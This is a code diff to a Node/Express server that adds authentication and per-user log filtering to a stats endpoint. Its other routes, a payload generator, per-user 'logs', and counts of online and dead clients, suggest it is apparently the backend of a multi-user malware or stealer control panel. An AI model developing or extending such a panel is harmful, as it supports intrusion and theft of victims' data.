@@ -1361,10 +1361,28 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
     });
 });
 
-app.get('/api/stats', (req, res) => {
+app.get('/api/stats', authenticateToken, (req, res) => {
     try {
-        const stats = logsDb.getStats();
-        res.json(stats);
+        const username = req.user.username;
+        
+        // Get all logs and filter by user (same logic as /api/logs)
+        let logs = logsDb.getAll();
+        logs = logs.filter(log => {
+            const logUser = log.user;
+            if (!logUser || logUser === null || logUser === '' || logUser === undefined) {
+                return username === 'account';
+            }
+            return logUser === username;
+        });
+        
+        // Get general stats (for online/dead clients - these are global)
+        const allStats = logsDb.getStats();
+        
+        // Return stats with user-specific log count
+        res.json({
+            ...allStats,
+            totalLogs: logs.length // User-specific log count
+        });
     } catch (error) {
         console.error('Error fetching stats:', error);
         res.status(500).json({ message: 'Internal server error' });
